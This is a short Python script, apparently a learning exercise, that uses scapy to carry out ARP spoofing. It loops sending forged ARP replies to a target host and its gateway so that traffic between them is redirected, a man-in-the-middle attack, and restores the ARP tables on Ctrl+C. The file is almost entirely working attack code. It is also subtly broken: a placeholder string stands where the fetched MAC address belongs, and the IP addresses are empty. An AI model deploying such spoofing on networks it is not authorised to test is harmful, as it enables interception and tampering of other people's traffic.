#!/usr/bin/env python
import sys
import scapy.all as scapy
import time
# only works in python3 for now, type python3 instead of python file.py
# collects the mac address 
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)

    return answered_list[0][1].hwsrc

# peforms the spoof 
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="attacker mac address", psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# restores the arp table back to normal
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac= get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = ""
gateway_ip = ""

# call and use functions
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("[+] Packets sent: " + str(sent_packets_count), end='\r')
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C .... Resetting ARP tables..... Please Wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
